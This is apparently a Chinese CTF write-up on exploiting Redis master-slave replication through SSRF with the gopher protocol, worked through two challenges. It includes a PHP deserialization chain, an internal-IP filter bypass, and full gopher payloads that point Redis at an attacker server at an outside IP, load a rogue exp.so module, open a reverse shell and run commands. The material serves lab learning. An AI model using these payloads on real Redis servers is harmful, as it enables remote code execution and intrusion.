# redis数据库主从复制

<!--more-->
# redis主从复制

**1**redis是什么参考：https://www.cnblogs.com/testfan2019/p/11008297.html

一款内存高速缓存数据库，

![](https://pic.imgdb.cn/item/65ec54b19f345e8d03c28fd5.jpg)

 最大的特点:快

**2**gopher协议是什么

Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处

 gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议

 Gopher协议格式：URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流

其实感觉gopher协议就是可以发送数据流，在ssrf中这个协议类似可以传递数据命令。

**3**redis主从复制是什么

Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式

**4**为什么要用redis主从复制来getshell

<font color=red>随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了</font>

所以可见并不是想用，是redis的另外三种方法都不行了才用的。

![](https://pic.imgdb.cn/item/65ec42979f345e8d037f8b10.png)

slaveof后面跟的是主服务器ip

### 2023年春秋杯网络安全联赛冬季赛   ezezez_php

```php
<?php
highlight_file(__FILE__);
include "function.php";
class Rd
{
    public $ending;
    public $cl;

    public $poc;

    public function __destruct()
    {
        echo "All matters have concluded"."</br>";
    }

    public function __call($name, $arg)
    {
        foreach ($arg as $key => $value) {

            if ($arg[0]['POC'] == "0.o") {
                $this->cl->var1 = "get";
            }
        }
    }
}

class Poc
{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?"."</br>";
        file_get_contents($paylaod);
    }
}

class Er
{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {   
        if (preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',base64_decode($this->Flag))){
               $value($this->Flag);
        }
    else {
    echo "NoNoNo,please you can look hint.php"."</br>";
    }
    }


}

class Ha
{
    public $start;
    public $start1;
    public $start2;

    public function __construct()
    {
        echo $this->start1 . "__construct" . "</br>";
    }

    public function __destruct()
    {
        if ($this->start2 === "o.0") {
            $this->start1->Love($this->start);
            echo "You are Good!"."</br>";
        }
    }
}

function get($url) {
    $url=base64_decode($url);
    var_dump($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $output = curl_exec($ch);
    $result_info = curl_getinfo($ch);
    var_dump($result_info);
    curl_close($ch);
    var_dump($output);
}


if (isset($_POST['pop'])) {
    $a = unserialize($_POST['pop']);
} else {
    die("You are Silly goose!");
}

?>

You are Silly goose!
```

看起来有很多的类，但有用的就几个，刚看这道题的时候还是很迷的，以为从Poc类下手利用file_get_contents，但看了师傅们的wp发现根本没用，而且<font color=red>Have you genuinely accomplished what you set out to do?</font>似乎也提示了。

这里的结尾是函数get，典型的ssrf，然后可以看到在Re类有把get赋值给变量，而给不存在的变量赋值可以触发set魔术方法，两个set，第一个完全是迷惑，第二个set是正确的。触发后，赋的值就是\$vaule的值，所以直接就调用get方法了，那么怎么触发call呢？把对象当作函数，可以看到Ha类

```php
 $this->start1->Love($this->start);
```

所以这里就是开始，链子  

Ha::\_\_destruct -> Rd::\_\_call -> Er::\_\_set -> get

exp

![](https://pic.imgdb.cn/item/65ec51b29f345e8d03b68514.jpg)

成功打到了get方法

![](https://pic.imgdb.cn/item/65ec51da9f345e8d03b72222.jpg)

可惜没环境了，最后的重点redis主从复制没办法复现。

参考：https://blog.csdn.net/mochu7777777/article/details/135760457

### **[网鼎杯 2020 玄武组]SSRFMe**

```php
<?php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}

function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }

}
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(!empty($url)){
        safe_request_url($url);
    }
}
else{
    highlight_file(__FILE__);
}
// Please visit hint.php locally.
?>
```

代码审计，函数check_inner_ip的作用过滤掉了127.0.0.1等本地ip，然后利用  

```php
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
```

过滤了dns跳转的绕过方法，可以用dns重绑定，然后0.0.0.0也可以绕过（0.0.0.0 代表本机 ipv4 的所有地址）。

绕过后可以拿到hint

![](https://pic.imgdb.cn/item/65ec43749f345e8d03824f4c.jpg)

看到file_put_contents后面内容可能会想到死亡绕过，但这里不是，没有写入权限。告诉了redis数据库密码，是redis数据库的攻击，

**redis常见的getshell有这么几种：**

1. 直接写webshell ，将shell写在web目录下
2. 写ssh公钥
3. 写crontab反弹shell，利用定时任务进行反弹shell
4. 主从复制进行getshell

这里第一中中没写入权限不行，然后这里没有ssh和crontab，所以只能用第三种，redis主从复制。

看师傅们的wp，准备好两个工具

```
https://github.com/xmsec/redis-ssrf
https://github.com/n0b0dyCN/redis-rogue-server
```

先是试了自己的kali虚拟机和服务器都没收到回显，看wp还可以用buu本地机试试。

启动buu本地的linux靶机，通过sftp把文件传输到靶机，在通过ssh连接上靶机，如下

![](https://pic.imgdb.cn/item/65ec43be9f345e8d03835b81.jpg)

![](https://pic.imgdb.cn/item/65ec43989f345e8d0382c671.jpg)

然后命令

```
python rogue-server.py   //开始监听
```

但是看有些师傅的wp还要构造payload，有些师傅直接就主从连上了，

url命令

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit

gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%252042.193.22.50%25206666%250d%250aquit

gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%252042.193.22.50%25206663%250d%250aquit

```

![](https://pic.imgdb.cn/item/65ec43d89f345e8d0383c1a1.jpg)

![](https://pic.imgdb.cn/item/65ec52f19f345e8d03bb7206.jpg)

但监听没有收到任何连接，以为这道题要烂尾了。

后面周师傅告诉我在NSSCTF上面有同样的题，换个靶场看看

首先先给kali内网穿透

![](https://pic.imgdb.cn/item/65ec440c9f345e8d0384831e.jpg)

然后下载好工具（不知道为什么工具不一样）

参考：[很经典的一道CTF-WriteUP(网鼎杯 2020 玄武组\)SSRFMe - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/293030.html)

 参考：https://blog.csdn.net/m0_73512445/article/details/134740916

```
https://github.com/n0b0dyCN/redis-rogue-server
# redis-rogue-server，未授权使用

https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server
# Awsome-Redis-Rogue-Server，有授权使用
```

然后把redis-rogue-server的exp.so复制到Awsome-Redis-Rogue-Server文件中，开启监听（最开始监听的是9001，结果发现还是没回显，以为又是环境问题，结果是frp配置问题，好在当初多配了几个端口）

```
python3 redis_rogue_server.py -v -path exp.so -lport 6666
```

先传入

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit
//设置备份文件路径，只有/tmp目录有权限
gopher://0.0.0.0:6379/_auth root
config set dir /tmp/
quit
```

会和上面一样，回显三个OK

然后在传入

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520ip%25209003%250d%250aquit
//设置了备份文件名，然后建立主从联系
gopher://0.0.0.0:6379/_auth root
config set dbfilename exp.so
slaveof 公网ip 9003
quit
```

![](https://pic.imgdb.cn/item/65ec44309f345e8d038501e3.jpg)

kali主机得到回显，开始一直循环同步。

![](https://pic.imgdb.cn/item/65ec44659f345e8d0385bd25.jpg)
```
gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit
//把攻击模块加载到从机
gopher://0.0.0.0:6379/_auth root
module load ./exp.so
quit
```

![](https://pic.imgdb.cn/item/65ec44479f345e8d03855723.jpg)

传入

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit
//断开主从同步
gopher://0.0.0.0:6379/_auth root
slaveof NO ONE
quit
```

主机：

![](https://pic.imgdb.cn/item/65ec44ba9f345e8d0386c1b7.jpg)
导入了模块就可以执行命令了

```
gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit

gopher://0.0.0.0:6379/_auth root
system.exec "cat /flag"
quit
```

得到flag

![](https://pic.imgdb.cn/item/65ec44cf9f345e8d03870a3e.jpg)

至于为什么上面显示连接来自于127.0.0.1，其实是因为frp的原因，可以看看云服务器上

![](https://pic.imgdb.cn/item/65ec44e89f345e8d0387593c.jpg)

![](https://pic.imgdb.cn/item/65ec45079f345e8d0387b6a6.jpg)

意思是连接时由云服务器转过来的，所以显示127.0.0.1

这道题还可以反弹shell，我就不复现了。


